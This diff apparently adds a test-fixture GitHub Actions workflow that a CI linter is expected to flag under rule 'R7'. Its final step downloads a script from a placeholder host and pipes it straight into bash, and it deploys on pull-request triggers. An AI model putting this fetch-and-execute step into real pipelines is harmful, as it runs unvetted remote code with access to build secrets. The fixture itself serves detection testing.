@@ -1,0 +1,15 @@
+# as: ci.yml
+# expect: R7
+name: ci
+on:
+  pull_request:
+  push:
+    branches: [phase2-site]
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-24.04
+    steps:
+      - run: npx -y wrangler@4 deploy
+      - run: curl -fsSL https://example.invalid/install | tee /tmp/x | bash
